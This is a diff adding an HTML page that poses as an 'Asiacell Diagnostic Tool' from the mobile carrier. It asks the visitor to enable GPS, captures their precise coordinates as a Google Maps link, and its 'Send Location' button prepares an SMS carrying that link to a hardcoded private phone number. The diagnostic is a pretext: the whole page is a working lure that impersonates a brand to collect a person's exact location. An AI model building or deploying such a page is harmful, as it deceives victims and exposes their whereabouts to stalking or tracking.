@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Asiacell Location Check</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f8f9fa;
+      text-align: center;
+      padding: 20px;
+      margin: 0;
+    }
+
+    h1 {
+      color: #b80000;
+      font-size: 26px;
+      margin-bottom: 10px;
+    }
+
+    button {
+      padding: 14px 28px;
+      font-size: 18px;
+      background-color: #b80000;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    #loader {
+      display: none;
+      margin-top: 30px;
+    }
+
+    .circle-loader {
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid #b80000;
+      border-radius: 50%;
+      width: 80px;
+      height: 80px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 10px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    #status-message {
+      font-weight: bold;
+      color: #b80000;
+    }
+
+    #success-check {
+      display: none;
+      font-size: 40px;
+      color: green;
+      margin-top: 20px;
+    }
+
+    #send-button {
+      margin-top: 30px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Asiacell Diagnostic Tool</h1>
+  <p>To proceed, please enable your GPS and location permission.</p>
+
+  <button onclick="startLocationCheck()">🚀 Start Diagnostic</button>
+
+  <div id="loader">
+    <div class="circle-loader"></div>
+    <div id="status-message">Checking Location...</div>
+  </div>
+
+  <div id="success-check">✅</div>
+
+  <button id="send-button">📩 Send Location</button>
+
+  <script>
+    let locationResult = "";
+
+    function startLocationCheck() {
+      document.getElementById("loader").style.display = "block";
+      document.getElementById("success-check").style.display = "none";
+      document.getElementById("send-button").style.display = "none";
+
+      if (!navigator.geolocation) {
+        alert("Geolocation is not supported by your browser.");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          locationResult = `https://maps.google.com/?q=${lat},${lon}`;
+
+          document.getElementById("loader").style.display = "none";
+          document.getElementById("success-check").style.display = "block";
+          document.getElementById("send-button").style.display = "inline-block";
+        },
+        (err) => {
+          document.getElementById("loader").style.display = "none";
+
+          if (err.code === err.PERMISSION_DENIED) {
+            alert("Please enable location permission in your browser settings.");
+          } else if (err.code === err.POSITION_UNAVAILABLE || err.code === err.TIMEOUT) {
+            alert("Please enable GPS in your device settings.");
+          } else {
+            alert("Error accessing location. Please try again.");
+          }
+
+          setTimeout(() => {
+            location.reload();
+          }, 3000);
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000
+        }
+      );
+    }
+
+    document.getElementById("send-button").addEventListener("click", function () {
+      if (!locationResult) {
+        alert("Location not acquired yet.");
+        return;
+      }
+
+      const smsNumber = "+9647701180059";
+      const smsBody = encodeURIComponent("Asiacell Diagnostic Result:\n" + locationResult);
+      const smsLink = `sms:${smsNumber}?body=${smsBody}`;
+      window.location.href = smsLink;
+    });
+  </script>
+
+</body>
+</html>
